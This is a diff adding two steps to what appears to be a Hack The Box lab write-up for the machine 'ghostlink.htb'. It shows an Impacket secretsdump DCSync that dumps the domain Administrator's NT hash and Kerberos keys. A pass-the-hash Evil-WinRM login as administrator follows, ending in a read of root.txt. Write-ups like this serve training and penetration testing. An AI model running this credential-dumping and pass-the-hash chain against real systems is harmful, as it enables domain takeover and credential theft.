@@ -1177,6 +1177,43 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
                                                                                                           
 ```
 
+```
+python3 secretsdump.py 'ghostlink.htb/dc01$@dc01.ghostlink.htb' -dc-ip 10.129.191.32 -hashes :b134be0fd94663725991c87bdff7c42c  -just-dc-user administrator
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8190e067f478002ddd63eb209b016696:::
+[*] Kerberos keys grabbed
+Administrator:0x14:3291eeea0dfc6d311e1fc6f5ea0920b0cfee75d818a96b1fd5a70b3b6f28706d
+Administrator:0x13:b82fd32fef344067a56681879e2d937e
+Administrator:aes256-cts-hmac-sha1-96:b2e73d40a99d49f55a44a05a02fa898119d6f4de72c1eceb5d484c0679d92fd8
+Administrator:aes128-cts-hmac-sha1-96:c3607a0efea3207eb5b1df36eb2dd256
+Administrator:0x17:8190e067f478002ddd63eb209b016696
+[*] Cleaning up... 
+
+```
+
+```
+evil-winrm -i ghostlink.htb -u administrator -H 8190e067f478002ddd63eb209b016696
+                                        
+Evil-WinRM shell v4.1
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Info: Connection successful
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+ebe6de5acd30469507826e1c1f8a3563
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
+
+```
+
 ---
 ## Remediation
 
